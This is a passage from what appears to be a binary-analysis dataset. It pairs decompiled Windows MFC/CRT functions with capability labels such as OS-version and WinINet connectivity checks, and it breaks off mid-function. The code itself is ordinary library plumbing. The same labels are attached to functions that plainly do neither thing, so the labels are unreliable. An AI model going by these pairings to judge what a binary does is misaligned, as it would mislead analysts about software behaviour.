            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0042f324(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = fcn.00444bf8();\n    if (*(iVar1 + 0x14) == '\\0') {\n        iVar1 = fcn.00444bc2();\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        uVar2 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(0xffffffff, 0x42f1a6, 0, uVar2);\n        *(iVar1 + 0x2c) = uVar2;\n    }\n    return;\n}\n",
        "token_count": 142
    },
    "0042f754": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0042f754(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    iVar1 = fcn.00444c1e();\n    if ((*(iVar1 + 0x18) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.0042eaa9(0x434cb4);\n        iVar3 = fcn.0042eabb(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.004307be(0x4519f0, 0x445c6e, 0x445c46, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x18) = uVar4;\n        fcn.0042eaa9(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x18);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 367
    },
    "0042ff7a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "contain loop"
        ],
        "decompiled_code": "\nuint __thiscall fcn.0042ff7a(int32_t param_1, int32_t param_2)\n\n{\n    if (param_2 != 0) {\n        for (; param_1 != 0; param_1 = *(param_1 + 0x10)) {\n            if (param_1 == param_2) {\n                return 1;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 93
    },
    "0043022e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043022e(int32_t arg_8h)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    \n    bVar6 = *(arg_8h + 2) == -1;\n    iVar2 = fcn.004301e3(arg_8h);\n    iVar3 = fcn.00430123(arg_8h);\n    if (iVar3 != 0) {\n        iVar2 = iVar2 + (bVar6 * 2 + 1) * 2;\n        iVar3 = fcn.00412048(iVar2);\n        iVar2 = iVar2 + 2 + iVar3 * 2;\n    }\n    if (bVar6) {\n        uVar1 = *(arg_8h + 0x10);\n    }\n    else {\n        uVar1 = *(arg_8h + 8);\n    }\n    if (uVar1 != 0) {\n        uVar5 = uVar1;\n        do {\n            puVar4 = (iVar2 + 3U & 0xfffffffc) + (-bVar6 & 6) + 0x12;\n            if (*puVar4 == 0xffff) {\n                puVar4 = puVar4 + 2;\n            }\n            else {\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                } while (uVar1 != 0);\n            }\n            if (*puVar4 == 0xffff) {\n                puVar4 = puVar4 + 2;\n            }\n            else {\n                do {\n                    uVar1 = *puVar4;\n                    puVar4 = puVar4 + 1;\n                } while (uVar1 != 0);\n            }\n            uVar1 = *puVar4;\n            if ((uVar1 != 0) && (!bVar6)) {\n                uVar1 = uVar1 - 2;\n            }\n            uVar5 = uVar5 - 1;\n            iVar2 = puVar4 + uVar1 + 2;\n        } while (uVar5 != 0);\n    }\n    return iVar2 - arg_8h;\n}\n",
        "token_count": 508
    },
    "004302f1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004302f1(uint lpMultiByteStr, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    ushort *puVar5;\n    uint32_t arg_ch_00;\n    uint *in_ECX;\n    int32_t iVar6;\n    int16_t iVar7;\n    uint32_t arg_8h;\n    bool bVar8;\n    uint var_54h;\n    uint hMem;\n    uint var_4ch;\n    uint var_48h;\n    uint lpWideCharStr;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    if (in_ECX[1] != 0) {\n        puVar2 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*in_ECX);\n        bVar8 = *(puVar2 + 2) == -1;\n        iVar3 = fcn.00430123(puVar2);\n        iVar1 = bVar8 * 2 + 1;\n        if (bVar8) {\n            puVar2[3] = puVar2[3] | 0x40;\n        }\n        else {\n            *puVar2 = *puVar2 | 0x40;\n        }\n        iVar4 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpMultiByteStr);\n        if (iVar4 < 0x20) {\n            iVar4 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, lpMultiByteStr, 0xffffffff, &lpWideCharStr, 0x20)\n            ;\n            iVar4 = iVar1 * 2 + iVar4 * 2;\n            puVar5 = fcn.004301e3(puVar2);\n            iVar6 = 0;\n            if (iVar3 != 0) {\n                iVar3 = fcn.00412048(puVar5 + iVar1);\n                iVar6 = iVar1 * 2 + 2 + iVar3 * 2;\n            }\n            arg_ch_00 = iVar6 + 3 + puVar5 & 0xfffffffc;\n            arg_8h = puVar5 + iVar4 + 3 & 0xfffffffc;\n            if (bVar8) {\n                iVar7 = *(puVar2 + 4);\n            }\n            else {\n                iVar7 = *(puVar2 + 2);\n            }\n            if ((iVar4 != iVar6) && (iVar7 != 0)) {\n                fcn.004105b0(arg_8h, arg_ch_00, puVar2 + (in_ECX[1] - arg_ch_00));\n            }\n            *puVar5 = arg_ch;\n            fcn.004105b0(puVar5 + iVar1, &lpWideCharStr, iVar4 + iVar1 * -2);\n            in_ECX[1] = in_ECX[1] + (arg_8h - arg_ch_00);\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*in_ECX);\n            in_ECX[2] = 0;\n        }\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 704
    },
    "00430429": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430429(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    char *lpMultiByteStr;\n    uint var_44h;\n    int32_t lpvObject;\n    uint var_24h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.GDI32.dll_GetStockObject;\n    uVar4 = 10;\n    var_4h = *0x4640c8;\n    lpMultiByteStr = \"System\";\n    iVar2 = (*_sym.imp.GDI32.dll_GetStockObject)(0x11);\n    if (iVar2 == 0) {\n        iVar2 = (*pcVar1)(0xd);\n        if (iVar2 == 0) goto code_r0x004304a2;\n    }\n    iVar2 = (*_sym.imp.GDI32.dll_GetObjectA)(iVar2, 0x3c, &lpvObject);\n    if (iVar2 != 0) {\n        lpMultiByteStr = &var_24h;\n        uVar3 = (*_sym.imp.USER32.dll_GetDC)(0);\n        if (lpvObject < 0) {\n            lpvObject = -lpvObject;\n        }\n        uVar4 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(uVar3, 0x5a);\n        uVar4 = (*_sym.imp.KERNEL32.dll_MulDiv)(lpvObject, 0x48, uVar4);\n        (*_sym.imp.USER32.dll_ReleaseDC)(0, uVar3);\n    }\ncode_r0x004304a2:\n    if (arg_8h == 0) {\n        arg_8h = uVar4;\n    }\n    fcn.004302f1(lpMultiByteStr, arg_8h);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 423
    },
    "00430909": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00430909(int32_t param_1)\n\n{\n    uint *puVar1;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    if (param_1 != 0) {\n        var_8h = -(*(param_1 + 0x44) != 0);\n        while (var_8h != 0) {\n            fcn.00427ea0(&var_8h, &var_ch, &var_4h);\n            puVar1 = *(param_1 + 0x58) + var_4h;\n            *puVar1 = 0;\n            if (*(param_1 + 0x5c) == 2) {\n                puVar1[1] = 0;\n            }\n            (**(param_1 + 0x18))(var_4h);\n        }\n        fcn.00427d83();\n        fcn.0040f5de();\n    }\n    return;\n}\n",
        "token_count": 222
    },
    "004309ad": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004309ad(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    \n    iVar1 = fcn.00444c1e();\n    if ((*(iVar1 + 0x10) != 0) && (iVar2 = *(iVar1 + 0x10) + -1,  *(iVar1 + 0x10) = iVar2,  iVar2 == 0)) {\n        if (arg_8h != 0) {\n            if (((arg_8h != -1) && (iVar2 = fcn.0042ed31(),  iVar2 != 0)) && (*(iVar2 + 0x38) != NULL)) {\n                (**(iVar2 + 0x38))(0, 0);\n            }\n            fcn.00430909();\n            fcn.00430909();\n            fcn.00430909();\n            fcn.00430909();\n            fcn.00430909();\n        }\n        iVar2 = fcn.00444bf8();\n        iVar2 = *(iVar2 + 4);\n        iVar3 = fcn.00446192();\n        if ((((iVar3 != 0) && (iVar2 != 0)) &&\n            ((*(iVar3 + 0xc) == 0 || (uVar4 = fcn.00412746(*(iVar3 + 0xc)),  uVar4 < *(iVar2 + 0x94))))) &&\n           (*(iVar2 + 0x94) != 0)) {\n            arg_8h = 0;\n            if (*(iVar3 + 0xc) != 0) {\n                arg_8h = fcn.00412746(*(iVar3 + 0xc));\n                fcn.00411031(*(iVar3 + 0xc));\n            }\n            iVar2 = fcn.0041101f(*(iVar2 + 0x94));\n            *(iVar3 + 0xc) = iVar2;\n            if ((iVar2 == 0) && (arg_8h != 0)) {\n                uVar5 = fcn.0041101f(arg_8h);\n                *(iVar3 + 0xc) = uVar5;\n            }\n        }\n    }\n    return *(iVar1 + 0x10) != 0;\n}\n",
        "token_count": 524
    },
    "00430aa6": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430aa6(char *lpString, int32_t arg_ch, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    char *pcVar5;\n    uint var_4h;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n    iVar3 = fcn.00447921(lpString, 0, 0);\n    iVar3 = iVar3 + -1;\n    pcVar5 = lpString + (iVar2 - iVar3);\n    if (arg_ch < iVar2) {\n        if (arg_ch < iVar3) {\n            if (arg_10h == 0) {\n                pcVar5 = 0x44da68;\n            }\n        }\n        else {\n            pcVar4 = lpString + 2;\n            if ((*lpString == '\\\\') && (lpString[1] == '\\\\')) {\n                for (; *pcVar4 != '\\\\'; pcVar4 = fcn.00412f81(pcVar4)) {\n                }\n            }\n            if (3 < iVar2 - iVar3) {\n                do {\n                    pcVar4 = fcn.00412f81(pcVar4);\n                } while (*pcVar4 != '\\\\');\n            }\n            iVar2 = pcVar4 - lpString;\n            if (iVar2 + 5 + iVar3 <= arg_ch) {\n                while (iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(pcVar4),  arg_ch < iVar3 + 4 + iVar2) {\n                    do {\n                        pcVar4 = fcn.00412f81(pcVar4);\n                    } while (*pcVar4 != '\\\\');\n                }\n                lpString[iVar2] = '\\0';\n                pcVar1 = _sym.imp.KERNEL32.dll_lstrcatA;\n                (*_sym.imp.KERNEL32.dll_lstrcatA)(lpString, \"\\\\...\");\n                (*pcVar1)(lpString, pcVar4);\n                return;\n            }\n        }\n        (*_sym.imp.KERNEL32.dll_lstrcpyA)(lpString, pcVar5);\n    }\n    return;\n}\n",
        "token_count": 477
    },
    "00431376": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00431376(char *lpString1, uint lpString2)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_61ch;\n    uint var_414h;\n    uint var_20ch;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(lpString1, lpString2);\n    if ((iVar2 == 0) &&\n       (iVar2 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x2a),  pcVar1 = _sym.imp.KERNEL32.dll_lstrlenA,  iVar2 != 0)) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString1);\n        iVar3 = (*pcVar1)(lpString2);\n        if (iVar2 == iVar3) {\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetThreadLocale)();\n            pcVar1 = _sym.imp.KERNEL32.dll_GetStringTypeExA;\n            (*_sym.imp.KERNEL32.dll_GetStringTypeExA)(uVar4, 1, lpString1, 0xffffffff, &var_20ch);\n            (*pcVar1)(uVar4, 4, lpString1, 0xffffffff, &var_414h);\n            (*pcVar1)(uVar4, 1, lpString2, 0xffffffff, &var_61ch);\n            if (*lpString1 != '\\0') {\n                iVar2 = 0;\n                do {\n                    if (((*(&var_414h + iVar2) & 0x80) != 0) && (*(&var_20ch + iVar2) != *(&var_61ch + iVar2))) break;\n                    iVar2 = iVar2 + 2;\n                    lpString1 = fcn.00412f81(lpString1);\n                } while (*lpString1 != '\\0');\n            }\n        }\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 464
    },
    "0043177e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0043177e(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CFile.0;\n    *(unaff_EBP + -4) = 0;\n    if ((extraout_ECX[1] != 0xffffffff) && (extraout_ECX[2] != NULL)) {\n        fcn.004316dd();\n    }\n    fcn.00401200();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 193
    },
    "004323b3": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004323b3(int32_t param_1, uint param_2)\n\n{\n    uint arg_8h;\n    int32_t arg_10h;\n    \n    if (param_1 != 0) {\n        arg_10h = param_1;\n        arg_8h = fcn.00432048(param_1, param_1, param_2);\n        fcn.0043236d(arg_8h, param_1, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 112
    },
    "004336d2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.004336d2(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    iVar1 = fcn.00444c1e();\n    if ((*(iVar1 + 0x1c) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.0042eaa9(0x434cb4);\n        iVar3 = fcn.0042eabb(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.004307be(0x44fc34, 0x443e8b, 0x443e34, 4, 2);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x1c) = uVar4;\n        fcn.0042eaa9(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x1c);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 369
    },
    "004337da": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004337da(code **param_1)\n\n{\n    uint uVar1;\n    \n    *param_1 = vtable.CDC.0;\n    if (param_1[1] != NULL) {\n        uVar1 = fcn.00433793();\n        (*_sym.imp.GDI32.dll_DeleteDC)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 84
    },
    "004339cf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.004339cf(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    iVar1 = fcn.00444c1e();\n    if ((*(iVar1 + 0x20) == 0) && (*(unaff_EBP + 8) != 0)) {\n        uVar2 = fcn.0042eaa9(0x434cb4);\n        iVar3 = fcn.0042eabb(0x60);\n        *(unaff_EBP + 8) = iVar3;\n        *(unaff_EBP + -4) = 0;\n        if (iVar3 == 0) {\n            uVar4 = 0;\n        }\n        else {\n            uVar4 = fcn.004307be(0x44fb94, 0x443ea7, 0x443e42, 4, 1);\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(iVar1 + 0x20) = uVar4;\n        fcn.0042eaa9(uVar2);\n    }\n    uVar2 = *(iVar1 + 0x20);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar2;\n}\n",
        "token_count": 364
    },
    "00434af7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434af7(int32_t hWnd, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint lpClassName;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    if ((hWnd != 0) && (uVar1 = (*_sym.imp.USER32.dll_GetWindowLongA)(hWnd, 0xfffffff0),  (uVar1 & 0xf) == arg_ch)) {\n        (*_sym.imp.USER32.dll_GetClassNameA)(hWnd, &lpClassName, 10);\n        (*_sym.imp.KERNEL32.dll_lstrcmpiA)(&lpClassName, \"combobox\");\n    }\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 168
    },
    "00434e3d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00434e3d(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((arg_ch == 0) || (arg_8h == 0)) {\n        iVar1 = 0;\n    }\n    else {\n        if ((*(in_ECX + 0x18) & 1) == 0) {\n            fcn.0043586f(4, *(in_ECX + 0x14));\n        }\n        uVar3 = *(in_ECX + 0x2c) - *(in_ECX + 0x28);\n        if (arg_ch < uVar3) {\n            uVar3 = arg_ch;\n        }\n        fcn.00411970(arg_8h, *(in_ECX + 0x28), uVar3);\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + uVar3;\n        arg_8h = arg_8h + uVar3;\n        uVar3 = arg_ch - uVar3;\n        if (uVar3 != 0) {\n            iVar1 = uVar3 - uVar3 % *(in_ECX + 0x20);\n            var_8h = 0;\n            var_4h = iVar1;\n            do {\n                iVar2 = (**(**(in_ECX + 0x24) + 0x34))(arg_8h, var_4h);\n                arg_8h = arg_8h + iVar2;\n                var_8h = var_8h + iVar2;\n                var_4h = var_4h - iVar2;\n                if (iVar2 == 0) break;\n            } while (var_4h != 0);\n            uVar3 = uVar3 - var_8h;\n            if ((uVar3 != 0) && (var_8h == iVar1)) {\n                uVar4 = 0;\n                if (*(in_ECX + 8) == 0) {\n                    if ((*(in_ECX + 0xc) != 0) || (var_4h = *(in_ECX + 0x20),  *(in_ECX + 0x20) < uVar3)) {\n                        var_4h = uVar3;\n                    }\n                    var_8h = *(in_ECX + 0x30);\n                    do {\n                        iVar1 = (**(**(in_ECX + 0x24) + 0x34))(var_8h, var_4h);\n                        var_8h = var_8h + iVar1;\n                        var_4h = var_4h - iVar1;\n                        uVar4 = uVar4 + iVar1;\n                        if ((iVar1 == 0) || (var_4h == 0)) break;\n                    } while (uVar4 < uVar3);\n                    iVar1 = *(in_ECX + 0x30);\n                    *(in_ECX + 0x2c) = iVar1 + uVar4;\n                }\n                else {\n                    (**(**(in_ECX + 0x24) + 0x50))(0, *(in_ECX + 0x20), in_ECX + 0x30, in_ECX + 0x2c);\n                    iVar1 = *(in_ECX + 0x30);\n                }\n                uVar4 = *(in_ECX + 0x2c) - iVar1;\n                *(in_ECX + 0x28) = iVar1;\n                if (uVar3 < uVar4) {\n                    uVar4 = uVar3;\n                }\n                fcn.00411970(arg_8h, iVar1, uVar4);\n                *(in_ECX + 0x28) = *(in_ECX + 0x28) + uVar4;\n                uVar3 = uVar3 - uVar4;\n            }\n        }\n        iVar1 = arg_ch - uVar3;\n    }\n    return iVar1;\n}\n",
        "token_count": 931
    },
    "00434fe1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00434fe1(uint32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    uint32_t uVar2;\n    uint32_t arg_8h_00;\n    int32_t iVar3;\n    int32_t in_ECX;\n    uint unaff_EBX;\n    int32_t iVar4;\n    uint unaff_ESI;\n    int32_t iVar6;\n    uint var_8h;\n    uint32_t var_4h;\n    uint32_t uVar5;\n    \n    if ((*(in_ECX + 0x18) & 1) != 0) {\n        uVar5 = *(in_ECX + 0x28);\n        piVar1 = in_ECX + 0x2c;\n        var_4h = *piVar1 - uVar5;\n        uVar2 = arg_8h + var_4h;\n        if (*(in_ECX + 8) == 0) {\n            arg_8h_00 = *(in_ECX + 0x30);\n            if (arg_8h_00 < uVar5) {\n                if (0 < var_4h) {\n                    fcn.004105b0(arg_8h_00, uVar5, var_4h);\n                    arg_8h_00 = *(in_ECX + 0x30);\n                    *(in_ECX + 0x28) = arg_8h_00;\n                    *piVar1 = arg_8h_00 + var_4h;\n                }\n                uVar5 = arg_8h;\n                if (*(in_ECX + 0xc) == 0) {\n                    uVar5 = *(in_ECX + 0x20);\n                }\n                iVar4 = uVar5 - var_4h;\n                iVar6 = var_4h + arg_8h_00;\n                do {\n                    iVar3 = (**(**(in_ECX + 0x24) + 0x34))(iVar6, iVar4);\n                    var_4h = var_4h + iVar3;\n                    iVar6 = iVar6 + iVar3;\n                    iVar4 = iVar4 - iVar3;\n                    if ((iVar3 == 0) || (iVar4 == 0)) break;\n                } while (var_4h < arg_8h);\n                *(in_ECX + 0x28) = *(in_ECX + 0x30);\n                *(in_ECX + 0x2c) = *(in_ECX + 0x30) + var_4h;\n            }\n        }\n        else {\n            if (var_4h != 0) {\n                (**(**(in_ECX + 0x24) + 0x28))(-var_4h, -var_4h >> 0x1f, 1);\n            }\n            (**(**(in_ECX + 0x24) + 0x50))(0, *(in_ECX + 0x20), in_ECX + 0x30, piVar1);\n            *(in_ECX + 0x28) = *(in_ECX + 0x30);\n        }\n        if (uVar2 <= *(in_ECX + 0x2c) - *(in_ECX + 0x28)) {\n            return;\n        }\n        unaff_EBX = 0;\n        unaff_ESI = 3;\n    }\n    fcn.0043586f(unaff_ESI, unaff_EBX);\n    return;\n}\n",
        "token_count": 765
    },
    "004350cc": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.004350cc(uint arg_8h, uint *arg_ch)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    puVar2 = arg_ch;\n    *arg_ch = 1;\n    fcn.0040dbd9(&arg_ch + 3);\n    if (arg_ch._3_1_ == -1) {\n        fcn.0040dca8(&arg_8h + 2);\n        if (arg_8h._2_2_ == -2) {\n            *puVar2 = 2;\n            fcn.0040dbd9(&arg_ch + 3);\n            if (arg_ch._3_1_ != -1) goto code_r0x0043511a;\n            fcn.0040dca8(&arg_8h + 2);\n        }\n        if (arg_8h._2_2_ == 0xffff) {\n            fcn.0040dceb(&arg_ch);\n            puVar2 = arg_ch;\n            if (arg_ch == 0xffffffff) {\n                fcn.0040dc60(&var_8h);\n                if ((var_4h != 0) || (puVar2 = var_8h,  0x7fffffff < var_8h)) {\n                    fcn.0043586f(1, 0);\n                    pcVar1 = swi(3);\n                    puVar2 = (*pcVar1)();\n                    return puVar2;\n                }\n            }\n        }\n        else {\n            puVar2 = arg_8h._2_2_;\n        }\n    }\n    else {\ncode_r0x0043511a:\n        puVar2 = 